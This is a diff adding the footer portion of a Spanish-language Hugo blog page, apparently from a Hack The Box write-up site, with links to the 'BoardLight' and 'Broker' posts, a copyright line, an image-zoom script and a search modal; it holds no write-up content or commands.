+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeupps/htb-boardlight/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HTB - BoardLight
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-09-05T00:00:00&#43;00:00">5 septiembre 2026</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeupps/htb-broker/">
+              <span class="leading-6">
+                HTB - Broker&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-09-24T00:00:00&#43;00:00">24 septiembre 2026</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Ir arriba"
+    title="Ir arriba">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Fluwhen
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Buscar"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Cerrar (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
